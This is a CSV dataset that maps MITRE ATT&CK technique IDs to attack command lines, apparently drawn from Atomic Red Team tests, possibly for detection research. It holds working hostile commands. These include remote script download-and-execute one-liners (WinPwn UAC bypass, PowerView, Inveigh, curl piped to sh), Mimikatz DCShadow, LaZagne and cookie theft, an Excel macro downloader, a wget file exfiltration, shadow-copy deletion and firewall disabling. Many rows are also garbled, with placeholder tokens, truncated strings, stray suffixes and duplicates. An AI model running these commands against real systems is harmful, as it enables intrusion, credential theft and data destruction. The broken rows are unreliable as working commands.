mitre_id,command
T1072,"""%programfiles(x86)%\var_445"""
T1612,docker  build  -t  t1612  $pathtoatomicsfolder\t1612\src\  docker  run  --name  t1612_container  --rm  -d  -t  t1612  docker  exec  t1612_container  .\test.sh# run_5547
T1055,"start-process ""$pathtoatomicsfolder\t1055\bin\x64\redvanity.exe"" var_61758"
T1110,"import-module -name azuread $passwords = ""var_79706 write-host ""end of bruteforce"""
T1082,"reg query ""hkey_current_user\control panel\international\geo"""
T1518,"wmic \node:localhost \namespace:\\root\microsoft\windows\defender path msft_mppreference get \format:list | findstr \i \c:""disablerealtimemonitoring"" \c:""exclusionpath"" \c:""exclusionextension"" \c:""exclusionprocess""# run_3078"
T1574,sudo sh -c 'echo var_394 > \etc\ld.so.preload'
T1580,aws ec2 describe-security-groups --profile var_22542
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_109"""
T1207,"# starting fake dc server, as system (required) $dc_output_file = ""pathtoatomicsfolder\..\externalpayloads\art-t1207-mimikatz-dc.log"" remove-item $dc_output_file -erroraction ignore $mimikatzparam =""`""log $dc_output_file`"" `""lsadump::dcshadow \object:var_382"" ""lsadump::dcshadow \push"" ""exit"" write-host ""`nwaiting for fake dc server to return"" wait-process $dc write-host ""`noutput from fake dc server:"" get-content $dc_output_file start-sleep 1 # wait a little until the file is not locked anymore so we can actually delete it remove-item $dc_output_file -erroraction ignore write-host ""end of dcshadow"""
T1057,"start-process  -filepath  ""$env:programfiles\process  hacker  2\var_412"""
T1129,"var_97782"""
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""var_672 while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1556,"reg.exe export hklm\system\currentcontrolset\control\lsa\ ""pathtoatomicsfolder\t1556.002\lsa_backup.reg"" $passwordfiltername = (copy-item ""var_665"" -destination ""%systemroot%\system32"" -passthru).basename $lsakey = get-item ""hklm:\system\currentcontrolset\control\lsa\"" $notificationpackagesvalues = $lsakey.getvalue(""notification packages"") $notificationpackagesvalues += $passwordfiltername set-itemproperty ""hklm:\system\currentcontrolset\control\lsa\"" ""notification packages"" $notificationpackagesvalues"
T1195,"kubectl run var_61794 --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1566,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1204.002\src\invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""var_79072"""
T1074,curl -s https:\\raw.githubusercontent.com\redcanaryco\atomic-red-team\master\atomics\t1074.001\src\discovery.sh | sh -s > var_474
T1216,"c:\windows\system32\syncappvpublishingserver.vbs ""\n;#{command_to_execute}""> /dev/null 2>&1 # id_34"
T1485,gcloud config set project var_4655
T1497,ping -c var_756
T1496,yes  >  \dev\null# run_5884
T1120,get-printer# run_3456
T1098,"$credfile  =  ""var_195"
T1098,"import-module -name azuread $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{username}"", $pword connect-azuread -credential $credential $aadapplication = new-azureadapplication -displayname ""#{application_name}"" $serviceprincipal = new-azureadserviceprincipal -appid $aadapplication.appid #$aadapplication = get-azureadapplication -filter ""displayname eq '#{application_name}'"" #get service principal of microsoft graph resource api $graphsp = get-azureadserviceprincipal -filter ""displayname eq 'microsoft graph'"" #initialize requiredresourceaccess for microsoft graph resource api $requiredgraphaccess = new-object microsoft.open.azuread.model.requiredresourceaccess $requiredgraphaccess.resourceappid = $graphsp.appid $requiredgraphaccess.resourceaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.resourceaccess] #set application permissions $applicationpermissions = @('#{application_permission}') $reqpermission = $graphsp.approles | where-object {$_.value -eq $applicationpermissions} if($reqpermission) { $resourceaccess = new-object microsoft.open.azuread.model.resourceaccess $resourceaccess.type = ""role"" $resourceaccess.id = $reqpermission.id #add required app permission $requiredgraphaccess.resourceaccess.add($resourceaccess) } else { write-host ""app permission $permission not found in the graph resource api"" -foregroundcolor red } #add required resource accesses $requiredresourcesaccess = new-object system.collections.generic.list[microsoft.open.azuread.model.requiredresourceaccess] $requiredresourcesaccess.add($requiredgraphaccess) #set permissions in existing azure ad app set-azureadapplication -objectid $aadapplication.objectid -requiredresourceaccess $requiredresourcesaccess $serviceprincipal = get-azureadserviceprincipal -filter ""appid eq '$($aadapplication.appid)'"" new-azureadserviceapproleassignment -objectid $serviceprincipal.objectid -principalid $serviceprincipal.objectid -resourceid $graphsp.objectid -id $reqpermission.id"
T1095,"cmd \c ""var_730"
T1651,"import-module ""pathtoatomicsfolder\t1651\src\t1651-1\awsssmattack.ps1"" -force $access_key = ""var_970"" set-awsauthentication -accesskey $access_key -secretkey $secret_key -sessiontoken $session_token -awsprofile $aws_profile -awsregion $region invoke-terraform -terraformcommand init -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand apply -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"") invoke-ssmattack -awsprofile ""t1651-1"" -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" invoke-terraform -terraformcommand destroy -terraformdirectory ""pathtoatomicsfolder\t1651\src\t1651-1"" -terraformvariables @(""profile=t1651-1"", ""region=$region"")"
T1007,launchctl list> /dev/null 2>&1 # id_40
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }""> /dev/null 2>&1 # id_52"
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""# run_1947"
T1613,docker build -t t1613 $pathtoatomicsfolder\t1613\src\ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_93
T1580,aws ec2 describe-security-groups --profile var_630
T1048,"wget --post-file=""var_985 --delete-after"
T1218,"# import the required test harness function, invoke-buildandinvokeinstallutilassembly . ""#{test_harness}"" $installerassemblydir = ""#{assembly_dir}"" $installerassemblyfilename = ""#{assembly_filename}"" $installerassemblyfullpath = join-path -path $installerassemblydir -childpath $installerassemblyfilename $commandline = ""/logfile= /logtoconsole=false /installtype=notransaction /action=install `""$installerassemblyfullpath`"""" $expectedoutput = 'constructor_install_' $testargs = @{ outputassemblydirectory = $installerassemblydir outputassemblyfilename = $installerassemblyfilename invocationmethod = '#{invocation_method}' commandline = $commandline } $actualoutput = invoke-buildandinvokeinstallutilassembly @testargs if ($actualoutput -ne $expectedoutput) { throw @"" installutil install method execution test failure. installer assembly execution output did not match the expected output. expected: $expectedoutput actual: $actualoutput ""@ }"
T1127,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1202,"conhost.exe ""var_176"""
T1072,"""%programfiles(x86)%\var_429"""
T1620,iex(new-object net.webclient).downloadstring('https:\\raw.githubusercontent.com\s3cur3th1ssh1t\winpwn\121dcee26a7aca368821563cbe92b2b5638c5773\winpwn.ps1') mimiload -consoleoutput -noninteractive# run_6177
T1542,"echo  ""creating  %systemroot%\wpbbin.exe""  new-item  -itemtype  file  -path  ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_11"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_39921 write-host ""end of federation configuration."""
T1140,copy %windir%\system32\certutil.exe %temp%\tcm.tmp %temp%\tcm.tmp -encode var_60509 %temp%\t1140_calc2.txt %temp%\tcm.tmp -decode %temp%\t1140_calc2.txt %temp%\t1140_calc2_decoded.exe
T1090,networksetup -setwebproxy var_899
T1202,forfiles \p %systemroot%\system32 \m notepad.exe \c var_633
T1546,"reg add ""hklm\software\microsoft\windows\windows error reporting\hangs"" /v debugger /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f# run_4317"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_318
T1572,c:\users\public\ngrok\ngrok.exe  config  add-authtoken  var_162  |  out-null  start-sleep  -s  5  stop-job  -name  job1  |  out-null
T1547,"new-item -itemtype directory -path ""#{new_startup_folder}"" copy-item -path ""#{payload}"" -destination ""#{new_startup_folder}"" set-itemproperty -path ""hkcu:\software\microsoft\windows\currentversion\explorer\user shell folders"" -name ""startup"" -value ""#{new_startup_folder}"""
T1124,net time \\var_344 w32tm \tz
T1547,"$shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:appdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save() $shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:programdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save()"
T1611,if [ ! -d var_11702 2>&1
T1572,"set-location ""pathtoatomicsfolder"" .\t1572\src\t1572-doh-beacon.ps1 -dohserver var_262"
T1007,powershell.exe get-service; echo 27 > $null
T1014,sudo  modprobe  var_879
T1555,"start-process ""#{webbrowserpassview_path}"" start-sleep -second 4 stop-process -name ""webbrowserpassview""> /dev/null 2>&1 # id_39"
T1543,"echo ""[unit]"" > var_46310"
T1201,cat /etc/pam.d/passwd# run_8622
T1219,"start-process -wait -filepath ""var_263"" -argument ""\silent"" -passthru start-process 'c:\program files (x86)\ultraviewer\ultraviewer_desktop.exe'"
T1552,python2 lazagne.py all
T1059,"export art='echo ""atomic red team was here... t1059.004""' echo $art |/bin/sh"
T1518,"\usr\libexec\plistbuddy  -c  ""print  :cfbundleshortversionstring""  \applications\safari.app\contents\info.plist  \usr\libexec\plistbuddy  -c  ""print  :cfbundleversion""  \applications\safari.app\contents\info.plist> /dev/null 2>&1 # id_34"
T1484,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""var_580 write-host ""end of federation configuration."""
T1036,"mkdir $home\... cp $(which sh) $home\... $home\...\sh -c ""echo var_870"""
T1550,#{crackmapexec_exe} #{domain} -u #{user_name} -h #{ntlm} -x #{command}
T1119,sc query type=service > %temp%\t1119_1.txt doskey \history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt> /dev/null 2>&1 # id_92
T1020,"$filename = ""var_774"
T1548,"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') uacbypass -noninteractive -command ""c:\windows\system32\cmd.exe"" -technique diskcleanup> /dev/null 2>&1 # id_73"
T1037,"echo ""var_50407"" \f"
T1497,"if [ ""$(system_profiler sphardwaredatatype | grep ""model identifier"" | grep -v 'mac')"" != """" ]; then echo 'virtualization environment detected'; fi;# run_4080"
T1563,"query user sc.exe create sesshijack binpath= ""cmd.exe \k tscon var_314"" net start sesshijack"
T1047,wmic useraccount get /all /format:csv
T1497,"$manufacturer  =  get-wmiobject  -class  win32_computersystem  |  select-object  -expandproperty  ""manufacturer""  $model  =  get-wmiobject  -class  win32_computersystem  |  select-object  -expandproperty  ""model""  if((($manufacturer.tolower()  -eq  ""microsoft  corporation"")  -and  ($model.tolower().contains(""virtual"")))  -or  ($manufacturer.tolower().contains(""vmware""))  -or  ($model.tolower()  -eq  ""virtualbox""))  {write-host  ""virtualization  environment  detected!""}  else  {write-host  ""no  virtualization  environment  detected!""}"
T1562,"new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\domainprofile"" -name enablefirewall -propertytype dword -value 0 -force new-itemproperty ""hklm:\software\policies\microsoft\windowsfirewall\standardprofile"" -name enablefirewall -propertytype dword -value 0 -force"
T1053,"""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" \\var_32414 logon"
T1046,nmap -pn -sv -p var_716
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\var_896"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer"
T1114,"powershell  -executionpolicy  bypass  -command  ""var_415"
T1001,"cat ""var_240"" | tail -n 1 | base64 -d | sh"
T1041,if(-not  (test-path  var_52001  -method  post  -body  $filecontent  -disablekeepalive
T1176,"# chromium $chromium = ""https:\\commondatastorage.googleapis.com\chromium-browser-snapshots\win_x64\1153778\chrome-win.zip"" # ublock origin lite to test side-loading $extension = ""https:\\github.com\ublockorigin\ubol-home\releases\download\ubolite_2024.11.25.25318\ubolite_2024.11.25.29438.chromium.mv3.zip"" set-location ""var_44059\extension\"" -passthru"
T1505,%windir%\system32\inetsrv\appcmd.exe  install  module  \name:var_61790
T1197,bitsadmin.exe \create var_344
T1220,"""var_855"""
T1040,sudo var_22151 -t 3
T1496,yes  >  \dev\null# run_7694
T1036,"mkdir $home\... cp $(which sh) $home\... $home\...\sh -c ""echo var_15339"""
T1486,7z a -p var_40472
T1652,"find /lib/modules/$(uname -r)/kernel/drivers -name ""*.ko*""> /dev/null 2>&1 # id_19"
T1505,"install-transportagent -name var_540 get-transportagent | format-list name,enabled"
T1112,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmkey /t reg_dword /d 2 /f"
T1036,"copy ""var_352).id stop-process -id $myt1036_003"
T1652,lsmod# run_5409
T1592,"get-ciminstance  -query  ""select  *  from  win32_pnpentity  where  (pnpclass  =  'image'  or  pnpclass  =  'camera')""> /dev/null 2>&1 # id_35"
T1129,"var_25833"""
T1595,"import-module  ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1""  invoke-wordlistscan  -target  ""var_246"""
T1216,"c:\windows\system32\syncappvpublishingserver.vbs ""\n;#{command_to_execute}"""
T1047,"wmic  \node:var_52627"""
T1550,"""var_54758"""
T1529,shutdown -r #{timeout}
T1613,docker build -t t1613 $pathtoatomicsfolder\t1613\src\ docker run --name t1613_container --rm -d -t t1613 docker ps docker stats --no-stream docker inspect $(docker ps -l -q --filter ancestor=t1613)> /dev/null 2>&1 # id_45
T1526,"import-module ""pathtoatomicsfolder\t1526\src\azurediscovery.ps1"" $client_id = ""var_630"""
T1021,"echo """" | ""var_44986"" ""vim-cmd hostsvc\enable_ssh"""
T1134,cmd /c '#{potato_path}' -l '#{listening_port}' -t * -p '#{target_exe}' -c '#{target_clsid}'# run_8996
T1595,"import-module ""pathtoatomicsfolder\t1595.003\src\webserverscan.ps1"" invoke-wordlistscan -target ""var_323"""
T1120,get-printer# run_6948
T1490,wmic.exe shadowcopy delete
T1135,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') shareenumeration -noninteractive -consoleoutput> /dev/null 2>&1 # id_56
T1201,get-addefaultdomainpasswordpolicy> /dev/null 2>&1 # id_84
T1007,schtasks  \query  \fo  list  \v> /dev/null 2>&1 # id_82
T1531,"az login $userprincipalname = ""var_218"" az ad user delete --id $userprincipalname"
T1047,"wmic  process  get  caption,executablepath,commandline  \format:csv"
T1558,"remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""var_508 while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\golden.txt # cleanup temp files remove-item $env:temp\golden.bat -erroraction ignore remove-item $env:temp\golden.txt -erroraction ignore"
T1048,send-mailmessage -from var_388
T1490,wmic.exe shadowcopy delete> /dev/null 2>&1 # id_16
T1548,"new-item ""hkcu:\software\classes\ms-settings\shell\open\command"" -force new-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""delegateexecute"" -value """" -force set-itemproperty ""hkcu:\software\classes\ms-settings\shell\open\command"" -name ""(default)"" -value ""var_347"" -force start-process ""%systemroot%\system32\computerdefaults.exe"""
T1609,kubectl create -f var_44908
T1095,"cmd \c ""var_995"
T1078,"net user #{guest_user} /active:yes net user #{guest_user} #{guest_password} net localgroup #{local_admin_group} #{guest_user} /add net localgroup ""#{remote_desktop_users_group_name}"" #{guest_user} /add reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f reg add ""hklm\system\currentcontrolset\control\terminal server"" /v ""allowtsconnections"" /t reg_dword /d 0x1 /f"
T1018,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/master/recon/powerview.ps1' -usebasicparsing); get-domaincontroller -verbose
T1578,"aws  ec2  create-snapshot  --region  var_20271  --description  ""atomic  red  team  test  snapshot""  --query  ""snapshotid""  --output  text"
T1526,"import-module ""pathtoatomicsfolder\..\externalpayloads\get-azdomaininfo.ps1"" $password = convertto-securestring -string ""var_173"" -verbose"
T1531,$pword = convertto-securestring -string var_65586
T1570,new-smbmapping  -remotepath  'var_411'  'z:\'
T1486,7z a -p var_87874
T1187,rpcping -s var_633 \a connect \u ntlm 1>$null
T1489,sudo killall -sigterm var_482
T1497,"if  [  ""$(sysctl  -n  hw.hv_vendor)""  !=  """"  ];  then  echo  ""virtualization  environment  detected"";  fi"
T1571,echo  quit  |  telnet  var_262  exit  0
T1195,"copy  %temp%\explorersync.db  %temp%\..\microsoft\explorersync.db  schtasks  \create  \tn  explorersync  \tr  ""javaw  -jar  %temp%\..\microsoft\explorersync.db""  \sc  minute  \f> /dev/null 2>&1 # id_27"
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestart \t reg_binary \d a273b6f07104d601 \f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe \v lastusedtimestop \t reg_binary \d 96ef514b7204d601 \f# run_4822
T1530,aws --no-sign-request s3 cp --recursive s3:\\var_640
T1571,test-netconnection -computername var_42253
T1486,"set-content  -path  ""var_356`"""""
T1557,"[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  ""https:\\raw.githubusercontent.com\kevin-robertson\inveigh\82be2377ade47a4e325217b4144878a59595e750\inveigh.ps1""  -usebasicparsing)  invoke-inveigh  -consoleoutput  y  -nbns  y  -mdns  y  -https  y  -proxy  y# run_5906"
T1072,"""%programfiles(x86)%\var_47377"""
T1649,"$archive=""$env:public\t1649\atomic_certs.zip""  $exfilpath=""$env:public\t1649\certs""  add-type  -assembly  ""system.io.compression.filesystem""  remove-item  $(split-path  $exfilpath)  -recurse  -force  -erroraction  ignore  mkdir  $exfilpath  |  out-null  foreach  ($cert  in  (gci  cert:\currentuser\my))  {  export-certificate  -cert  $cert  -filepath  $exfilpath\$($cert.friendlyname).cer}  [io.compression.zipfile]::createfromdirectory($exfilpath,  $archive)# run_6139"
T1219,"start-process -filepath ""c:program files (x86)\splashtop\splashtop remote\server\#{srserver_exe}"""
T1491,"$notepath  =  join-path  $env:temp  ""var_639""  $header  =  $title  +  ""`r`n""  +  ('='  *  $title.length)  +  ""`r`n`r`n""  $content  =  $header  +  $body  [system.io.file]::writealltext($notepath,  $content,  [system.text.encoding]::utf8)  $p  =  start-process  notepad.exe  -argumentlist  ""`""$notepath`""""  -passthru  $p.id  |  out-file  -filepath  $pidpath  -encoding  ascii  -force"
T1140,"encoded=$(python3 -c 'import base64;enc=base64.b64encode(""var_91388').read());print(dec.decode())"""
T1570,net use * 'var_51322' '*:\'
T1574,get-acl registry::hklm\system\currentcontrolset\services\* |fl get-acl registry::hklm\system\currentcontrolset\services\var_799 |fl
T1216,set  comspec=var_936  cscript  %windir%\system32\manage-bde.wsf
T1049,$syntaxlist  =  var_10866
T1496,yes  >  \dev\null> /dev/null 2>&1 # id_12
T1539,"stop-process -name ""chrome"" -force -erroraction silentlycontinue ""select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [cookies];"" | cmd \c var_94609"""
T1542,"echo ""creating %systemroot%\wpbbin.exe"" new-item -itemtype file -path ""$env:systemroot\system32\wpbbin.exe""> /dev/null 2>&1 # id_92"
T1559,"""pathtoatomicsfolder\..\externalpayloads\build\namedpipes_executor.exe"" --pipe 2# run_2119"
T1030,$file = [system.io.file]::openread(var_536 $file.close()
T1082,ver
T1135,[net.servicepointmanager]::securityprotocol  =  [net.securityprotocoltype]::tls12  iex  (iwr  'https:\\raw.githubusercontent.com\powershellmafia\powersploit\f94a5d298a1b4c5dfb1f30a246d9c73d13b22888\recon\powerview.ps1'  -usebasicparsing);  find-domainshare  -checkshareaccess  -verbose; echo 17 > $null
T1113,screencapture var_653
T1221,"start ""var_97847"""
T1071,var_824 >nul 2>&1
T1489,sudo killall -sigterm var_94779
T1490,wbadmin delete catalog -quiet> /dev/null 2>&1 # id_37
T1123,sh var_31339
T1218,"cmstp.exe /s ""#{inf_file_path}"""
T1071,"for($i=0; $i -le #{query_volume}; $i++) { resolve-dnsname -type ""#{query_type}"" ""#{subdomain}-$(get-random -minimum 1 -maximum 999999).#{domain}"" -quicktimeout}"
T1030,$file = [system.io.file]::openread(var_331 $file.close()
T1217,"find \ -path ""*\safari\bookmarks.plist"" 2>\dev\null >> var_16540"
T1134,"start-process ""var_637"" -argument ""-u:t -p:e cmd"" start-sleep -second 5 stop-process -name ""cmd"" -force -erroraction silentlycontinue"
T1555,"cd ~\library\cookies grep -q ""var_58860"" ""cookies.binarycookies"""
T1112,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v securitylayer /t reg_dword /d 0 /f"
T1217,"find \ -path ""*\safari\bookmarks.plist"" 2>\dev\null >> var_796"
T1007,net.exe start >> #{output_file}> /dev/null 2>&1 # id_10
T1012,"reg query ""hklm\software\microsoft\windows nt\currentversion\windows"" reg query hklm\software\microsoft\windows\currentversion\runservicesonce reg query hkcu\software\microsoft\windows\currentversion\runservicesonce reg query hklm\software\microsoft\windows\currentversion\runservices reg query hkcu\software\microsoft\windows\currentversion\runservices reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\notify"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\userinit"" reg query ""hkcu\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query ""hklm\software\microsoft\windows nt\currentversion\winlogon\\shell"" reg query hklm\software\microsoft\windows\currentversion\shellserviceobjectdelayload reg query hklm\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\runonceex reg query hklm\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\run reg query hkcu\software\microsoft\windows\currentversion\runonce reg query hklm\software\microsoft\windows\currentversion\policies\explorer\run reg query hkcu\software\microsoft\windows\currentversion\policies\explorer\run reg query hklm\system\currentcontrolset\services \s | findstr imagepath 2>nul | findstr \ri "".*\.sys$"" reg query hklm\software\microsoft\windows\currentversion\run reg query hklm\system\currentcontrolset\control\safeboot reg query ""hklm\software\microsoft\active setup\installed components"" reg query ""hklm\software\microsoft\windows\currentversion\group policy\scripts\startup""# run_7321"
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_685
T1220,"wmic var_613"""
T1007,"if  [  ""$(uname)""  =  'freebsd'  ];  then  service  -e;  else  systemctl  --type=service;  fi;# run_2701"
T1552,find #{search_path} -name id_rsa 2>/dev/null >> #{output_file} exit 0
T1204,"$fname = ""$env:temp\atomic_redteam_x4m_exec.vbs"" $fname1 = ""$env:temp\procexp.exe"" if (test-path $fname) { remove-item $fname remove-item $fname1 } $xlapp = new-object -comobject ""excel.application"" $xlapp.visible = $true $xlapp.displayalerts = $false $xlbook = $xlapp.workbooks.add() $sheet = $xlbook.excel4macrosheets.add() if (""var_97179`""`""`"")"" $sheet.cells.item(7,1) = ""=fwriteln(a5, `""`"")"" $sheet.cells.item(8,1) = ""=fwriteln(a5, `""set winhttp = createobject(`""`""winhttp.winhttprequest.5.1`""`"")`"")"" $sheet.cells.item(9,1) = ""=fwriteln(a5, `""winhttp.open `""`""get`""`"", url, false`"")"" $sheet.cells.item(10,1) = ""=fwriteln(a5, `""winhttp.send`"")"" $sheet.cells.item(11,1) = ""=fwriteln(a5, `""if winhttp.status = 200 then`"")"" $sheet.cells.item(12,1) = ""=fwriteln(a5, `""set ostream = createobject(`""`""adodb.stream`""`"")`"")"" $sheet.cells.item(13,1) = ""=fwriteln(a5, `""ostream.open`"")"" $sheet.cells.item(14,1) = ""=fwriteln(a5, `""ostream.type = 1`"")"" $sheet.cells.item(15,1) = ""=fwriteln(a5, `""ostream.write winhttp.responsebody`"")"" $sheet.cells.item(16,1) = ""=fwriteln(a5, `""ostream.savetofile `""`""c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`""`"", 2`"")"" $sheet.cells.item(17,1) = ""=fwriteln(a5, `""ostream.close`"")"" $sheet.cells.item(18,1) = ""=fwriteln(a5, `""end if`"")"" $sheet.cells.item(19,1) = ""=fclose(a5)"" $sheet.cells.item(20,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a3&`""`"")"" $sheet.cells.item(21,1) = ""=wait(now()+`""00:00:05`"")"" $sheet.cells.item(22,1) = ""=exec(`""explorer.exe c:\users\`""&a1&`""\appdata\local\temp\`""&a2&`""`"")"" $sheet.cells.item(23,1) = ""=halt()"" $sheet.cells.item(1,1).name = ""runme"" $xlapp.run(""runme"") $xlapp.quit() [system.runtime.interopservices.marshal]::releasecomobject($xlbook) | out-null [system.runtime.interopservices.marshal]::releasecomobject($xlapp) | out-null [system.gc]::collect() [system.gc]::waitforpendingfinalizers() remove-variable xlbook remove-variable xlapp"
T1614,var_37843
T1572,c:\users\public\ngrok\ngrok.exe config add-authtoken var_783 | out-null start-sleep -s 5 stop-job -name job1 | out-null
T1087,"""pathtoatomicsfolder\..\externalpayloads\adfind.exe"" -f (objectcategory=person) var_792"
T1112,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disableremotedesktopantialias"" /t reg_dword /d 1 /f"
T1119,sc query type=service > %temp%\t1119_1.txt doskey \history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt# run_9539
T1127,"var_971"""
T1485,"if (-not (test-path ""var_95290"""
T1010,c:\windows\microsoft.net\framework\v4.0.30319\csc.exe -out:var_227
T1046,nmap -pn -sv -p var_40475
T1036,"add-type -typedefinition @' public class test { public static void main(string[] args) { system.console.writeline(""tweet, tweet""); } } '@ -outputassembly ""var_67522"""
